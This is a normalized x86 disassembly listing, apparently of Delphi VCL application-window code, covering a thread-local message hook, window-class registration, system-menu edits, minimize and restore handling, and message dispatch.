cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_4555d4
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_455578
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45568c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_4556e8
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_455718
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_455740
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4556e8
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_455718
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_455718
sub_455780
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4191e0
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_456e58
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_421144
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_421514
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4575f0
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c054
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_457050
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c07c
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408380
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4041dc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_4577cc
mov eax ebx
call sub_458190
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_455a88
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_455969
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_4581a0
mov [ esp + 0x4 ] esi
mov [ esp ] sub_456e58
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_457050
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4579ec
xor edx edx
mov eax esi
call sub_457368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41922c
push esi
push sub_455ebc
mov eax esi
call sub_456c44
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4055a8
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403234
mov eax [ esi + 0x90 ]
call sub_403234
mov eax [ esi + 0x98 ]
call sub_403234
test bl bl
jle r-xdata
call sub_41a31c
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_455a88
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c30
lea eax [ ebp - 0x2c ]
call sub_403f6c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_456008
call sub_41a284
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40442c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_4068ec
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f6c
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45670c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45670c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_455c38
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45496c
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_455c98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_4136e4
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_43db40
cmp ebx eax
je r-xdata
sub_455d08
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_455c98
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413840
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_455e20
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413840
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_455ebc
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c31c
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_454e78
mov eax [ rw-data ]
call sub_4554c0
sub_455f14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f78
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404164
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_455f80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_455fbc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45670c
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_456008
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4566c2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455ebc
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_457128
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_413840
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_43db40
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_458054
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_456c44
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_456be8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_43db40
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45670c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_4554c0
push ebp
call sub_455f80
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_455f80
pop ecx
jmp [ eax * 4 + jump_table_4560ac ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_43db40
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_456ac0
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_442498
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455f14
push ebp
call sub_455f80
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_455f80
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_455f80
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_419040
jmp r-xdata
xor eax eax
call sub_44de38
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_43db40
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43850c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456728
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_455f80
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4536c0
jmp r-xdata
push ebp
call sub_455f80
pop ecx
jmp r-xdata
push ebp
call sub_455fbc
pop ecx
jmp r-xdata
push ebp
call sub_455f80
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4567d8
jmp r-xdata
jmp r-xdata
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e10
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e20
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e18
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44dce8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_455f80
pop ecx
jmp r-xdata
call sub_44dd9c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_455f80
pop ecx
jmp r-xdata
call sub_42a64c
call sub_42a788
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40ccc4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_456728
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_455e10
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_455740
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_43db40
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43db40
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_4567d8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_455740
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_43db40
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_455e20
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_43db40
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_45144c
mov eax [ ebx + 0x44 ]
call sub_453868
sub_4568d8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_456914
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403fc0
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_40405c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_456960
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_456984
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_4569d4
push ebx
push esi
push edi
push ebp
mov esi edx
